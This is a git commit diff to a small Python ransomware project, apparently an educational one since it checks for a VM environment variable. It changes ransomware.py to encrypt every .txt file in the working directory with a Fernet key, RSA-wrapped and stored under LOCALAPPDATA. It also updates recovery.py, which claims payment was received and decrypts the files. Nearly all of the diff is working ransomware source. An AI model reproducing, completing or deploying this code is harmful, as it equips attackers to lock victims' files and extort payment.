9d15d1e0489fe230e8d75967f7a84582571c3a48
Zachareee <zacharytanhx@yahoo.com>
2024-03-04 14:29:17 +0800

    Changed file encryption algo to symmetric, added install script, symmetric key saved to APPDATA/local

--- encrypter/ransomware.py
+++ encrypter/ransomware.py
@@ -2,36 +2,44 @@ import os, base64, sys
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.backends import default_backend 
 from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.fernet import Fernet
 
-files = os.listdir()
 
-def encrypt(plaintext):
-    key_file = "public_key.pem"
-    if getattr(sys, 'frozen', False):
-        key_file = os.path.join(sys._MEIPASS, key_file)
+def encrypt(plaintext: bytes, key: Fernet) -> None:
+    return key.encrypt(plaintext)
 
-    with open(key_file, "rb") as key_file:
+def encryption(key: bytes):
+    save_key("public_key.pem", key, "ransomware")
+    fernet = Fernet(key)
+    files = os.listdir()
+    for file in files:
+        if file.endswith(".txt"):
+            with open(file,"rb") as f:
+                plaintext = f.read()
+            with open(file,"wb") as f:
+                f.write(encrypt(plaintext, fernet))
+
+def save_key(keyfile: str, key: bytes, save_loc, filename = "keyfile"):
+    with open(keyfile, "rb") as f:
         public_key = serialization.load_pem_public_key(
-            key_file.read(),
+            f.read(),
             backend=default_backend()
         )
-    encrypted = base64.b64encode(public_key.encrypt(
-        plaintext,
+
+    encrypted_key = base64.b64encode(public_key.encrypt(
+        key,
         padding.OAEP(
             mgf=padding.MGF1(algorithm=hashes.SHA256()),
             algorithm=hashes.SHA256(),
             label=None
         )
     ))
-    return encrypted
 
-def encryption():
-    for file in files:
-        if file.endswith(".txt"):
-            with open(file,"rb") as f:
-                plaintext = f.read()
-            with open(file,"wb") as f:
-                f.write(encrypt(plaintext))
+    path = os.path.join(os.getenv("LOCALAPPDATA"), save_loc)
+    if not os.path.exists(path):
+        os.mkdir(path)
+    with open(os.path.join(path, filename), "wb") as f:
+        f.write(encrypted_key)
 
 skull = '''
                      ______
@@ -54,7 +62,7 @@ VM or sandbox and set RUNNING_ON_VM environment variable")
     sys.exit(1)
 
 try: 
-    encryption()
+    encryption(Fernet.generate_key())
     print(skull)
     print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
     print("\n You Are Hacked \n")
--- encrypter/recovery.py
+++ encrypter/recovery.py
@@ -4,34 +4,47 @@ from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.backends import default_backend 
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
+from cryptography.fernet import Fernet
 
-files = os.listdir()
 
-def decrypt(encrypted):
+def decrypt(ciphertext: bytes, key: Fernet) -> None:
+    return key.decrypt(ciphertext)
+
+def decrypt_key(path: str) -> bytes:
     with open("private_key.pem", "rb") as key_file:
-        private_key = serialization.load_pem_private_key(
-            key_file.read(),
-            password=None,
-            backend=default_backend()
-        )
-        decrypted = private_key.decrypt(
-        base64.b64decode(encrypted),
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
-        )
-    )
-    return decrypted
+        with open(path, "rb") as keyfile:
+            private_key = serialization.load_pem_private_key(
+                key_file.read(),
+                password=None,
+                backend=default_backend()
+            )
+            key = private_key.decrypt(
+                base64.b64decode(keyfile.read()),
+                padding.OAEP(
+                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                    algorithm=hashes.SHA256(),
+                    label=None
+                )
+            )
+    return key
+
+
+def read_key() -> bytes:
+    path = os.path.join(os.getenv("LOCALAPPDATA"), "ransomware", "keyfile")
+    if not os.path.exists(path):
+        raise Exception("This machine is not infected")
+    
+    return decrypt_key(path)
 
 def decryption():
+    key = Fernet(read_key())
+    files = os.listdir()
     for file in files:
         if file.endswith(".txt"):
-            f = open(file,"rb")
-            encrypted = f.read()
-            f = open(file,"wb")
-            decrypted_txt = decrypt(encrypted)
-            f.write(decrypted_txt)
+            with open(file,"rb") as f:
+                encrypted = f.read()
+            with open(file,"wb") as f:
+                f.write(decrypt(encrypted, key))
 
 try:
     print("We have received your payment. We will begin decryption of your files.")
@@ -39,4 +52,4 @@ try:
     print("Your files has been decrypted successfully")
 except Exception as e:
     print("Decryption Failed")
-
+    print(e)
